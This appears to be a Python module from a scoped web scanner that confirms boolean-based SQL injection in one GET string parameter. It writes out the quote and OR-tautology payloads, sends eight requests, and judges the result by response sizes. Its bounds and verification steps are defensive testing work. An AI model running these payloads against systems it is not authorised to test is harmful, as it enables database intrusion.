"""Conservative Boolean SQLi proof for an observed string-valued GET field.

The recipe uses eight bounded, read-only requests. An independent verifier
must repeat it with a fresh nonce before the candidate can be published.
"""

from __future__ import annotations

import re
import secrets
from collections.abc import Callable
from urllib.parse import unquote_plus, urlsplit, urlunsplit

from .browser import assert_in_scope, origin
from .browser_actions import allowed_discovery_path
from .http_observe import observe_get


CHECK_ORDER = (
    "baseline_first", "quote_error", "escaped_quote", "true_first",
    "false_first", "true_second", "false_second", "baseline_last",
)
_SAFE_VALUE = re.compile(r"[A-Za-z][A-Za-z0-9 _-]{0,39}\Z")
_DIGEST = re.compile(r"[0-9a-f]{64}\Z")


def plan_string_boolean(
    url: str, *, parameter: str, allowed_origins: list[str],
) -> tuple[str, dict[str, str], str]:
    """Change only one observed, ordinary string field; preserve other query bytes."""
    assert_in_scope(url, allowed_origins)
    parts = urlsplit(url)
    if parts.fragment or len(url) > 2048 or len(parts.query) > 2048:
        raise ValueError("A bounded fragment-free observed GET URL is required")
    if not allowed_discovery_path(parts.path or "/"):
        raise ValueError("State-changing path is not eligible for SQLi proof")
    fields = parts.query.split("&")
    if len(fields) > 40 or not isinstance(parameter, str) or not 0 < len(parameter) <= 80:
        raise ValueError("A single bounded query parameter is required")
    matches = [i for i, field in enumerate(fields)
               if field and unquote_plus(field.split("=", 1)[0]) == parameter]
    if len(matches) != 1:
        raise ValueError("String parameter must occur exactly once")
    index = matches[0]
    name, sep, raw_value = fields[index].partition("=")
    value = unquote_plus(raw_value) if sep else ""
    if not _SAFE_VALUE.fullmatch(value):
        raise ValueError("Boolean SQLi proof requires an ordinary observed string value")
    nonce = str(secrets.randbelow(90000) + 10000)
    false_nonce = nonce[:-1] + str((int(nonce[-1]) + 1) % 10)

    def variant(suffix: str) -> str:
        changed = fields.copy()
        changed[index] = name + "=" + raw_value + suffix
        target = urlunsplit(parts._replace(query="&".join(changed)))
        assert_in_scope(target, allowed_origins)
        return target

    variants = {
        "baseline_first": url,
        "quote_error": variant("%27"),
        "escaped_quote": variant("%27%27"),
        "true_first": variant(f"%27%20OR%20%27{nonce}%27%3D%27{nonce}%27--%20"),
        "false_first": variant(f"%27%20OR%20%27{nonce}%27%3D%27{false_nonce}%27--%20"),
    }
    variants["true_second"] = variants["true_first"]
    variants["false_second"] = variants["false_first"]
    variants["baseline_last"] = url
    return url, variants, nonce


def string_sql_proof_valid(result: dict) -> bool:
    if result.get("operation") != "sqli_boolean_string" or result.get("proof_recipe") != "string_or_boolean_v1":
        return False
    if (result.get("method") != "GET" or result.get("location") != "query"
            or not result.get("target") or not result.get("parameter")
            or not re.fullmatch(r"[1-9][0-9]{4}", str(result.get("nonce", "")))):
        return False
    checks = result.get("checks")
    if not isinstance(checks, dict) or not all(isinstance(checks.get(key), dict) for key in CHECK_ORDER):
        return False
    rows = {key: checks[key] for key in CHECK_ORDER}
    if any(row.get("truncated") is not False or row.get("redirected") is not False
           or not _DIGEST.fullmatch(str(row.get("body_sha256", "")))
           or not isinstance(row.get("bytes_captured"), int) for row in rows.values()):
        return False
    success = [rows[key] for key in CHECK_ORDER if key != "quote_error"]
    if any(row.get("status") != 200 for row in success):
        return False
    if not 500 <= rows["quote_error"].get("status", 0) < 600:
        return False
    if not success[0].get("content_type") or any(
        row.get("content_type") != success[0]["content_type"] for row in success
    ):
        return False
    # HTML commonly contains changing CSRF or tracking tokens. Require the
    # repeated response sizes to remain stable instead of whole-body hashes.
    size = lambda key: rows[key]["bytes_captured"]
    stable = lambda first, second: abs(first - second) <= max(64, max(first, second) // 100)
    if not (stable(size("baseline_first"), size("baseline_last"))
            and stable(size("true_first"), size("true_second"))
            and stable(size("false_first"), size("false_second"))
            and rows["true_first"]["body_sha256"] != rows["false_first"]["body_sha256"]):
        return False
    # Equal-length payloads rule out a reflected string alone as the signal.
    # The true branch must expand the result substantially in both fresh runs.
    true_size = min(size("true_first"), size("true_second"))
    controls = max(size("baseline_first"), size("false_first"), size("escaped_quote"))
    return true_size - controls >= max(512, controls // 10)


def probe_string_boolean(
    baseline: str, variants: dict[str, str], nonce: str, *, parameter: str,
    allowed_origins: list[str], storage_state: dict | None,
    before_request: Callable[[], object],
) -> dict:
    checks = {}
    for key in CHECK_ORDER:
        before_request()
        response = observe_get(variants[key], allowed_origins, storage_state)
        checks[key] = {name: response[name] for name in (
            "status", "content_type", "bytes_captured", "truncated", "body_sha256", "redirected",
        )}
    parts = urlsplit(baseline)
    result = {
        "operation": "sqli_boolean_string", "proof_recipe": "string_or_boolean_v1",
        "target": origin(baseline) + (parts.path or "/"),
        "method": "GET", "location": "query", "parameter": parameter,
        "nonce": nonce, "requests_sent": len(CHECK_ORDER),
        "identity_transport": "named_identity_cookies_only", "checks": checks,
    }
    result["proof_confirmed"] = string_sql_proof_valid(result)
    return result
